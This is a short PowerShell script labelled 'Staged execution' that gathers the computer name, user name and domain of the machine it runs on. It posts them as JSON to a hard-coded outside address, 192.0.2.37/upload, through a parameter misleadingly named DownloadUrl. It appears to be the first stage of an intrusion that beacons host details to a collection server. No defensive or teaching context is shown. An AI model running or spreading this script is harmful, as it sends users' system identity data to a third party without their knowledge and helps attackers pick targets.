<# Staged execution #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = "https://192.0.2.37/upload"
)
$ProfileData = [ordered]@{ ComputerName = $env:COMPUTERNAME; UserName = $env:USERNAME; Domain = $env:USERDOMAIN }
Invoke-RestMethod -Uri $DownloadUrl -Method Post -Body ($ProfileData | ConvertTo-Json) -ContentType "application/json"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
